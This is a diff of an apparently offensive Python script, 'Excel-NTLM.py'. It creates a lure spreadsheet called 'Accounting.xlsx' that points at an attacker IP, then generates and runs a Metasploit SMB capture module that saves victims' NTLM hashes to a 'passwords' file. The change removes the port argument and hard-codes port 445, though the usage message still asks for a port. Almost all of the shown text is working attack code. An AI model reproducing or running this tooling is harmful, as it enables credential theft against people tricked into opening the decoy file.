@@ -13,29 +13,28 @@ def createXLSX(filename, server, port):
 	print("Fichero creado")
 
 
-def msfListener(ipAttacker, portAttacker):
+def msfListener(ipAttacker):
 	resourceFile = open('metasploit.rc','w')
 	resourceFile.write('''
 use auxiliary/server/capture/smb
 set SRVHOST <SERVER>
-set SRVPORT <PORT>
+set SRVPORT 445
 set JOHNPWFILE passwords
 run
-'''.replace('<SERVER>',ipAttacker).replace('<PORT>',portAttacker))
+'''.replace('<SERVER>',ipAttacker))
 	resourceFile.close()
 	print('[+] MSF Resource file generated ')
 	system('msfconsole -q -r metasploit.rc')
 
 def main():
-	if(len(sys.argv) < 3):
+	if(len(sys.argv) < 2):
 		print('Usage : Excel-NTLM.py IP_ATTACKER PORT_ATTACKER ')
-		print('Example : Excel-NTLM.py 10.10.1.110 445 ')
+		print('Example : Excel-NTLM.py 10.10.1.110')
 
 	else:
 		host = str(sys.argv[1])
-		port = str(sys.argv[2])
-		createXLSX("Accounting.xlsx", host, port)
-		msfListener(host, port)
+		createXLSX("Accounting.xlsx", host)
+		msfListener(host)
 
 if __name__ == "__main__":
     main()
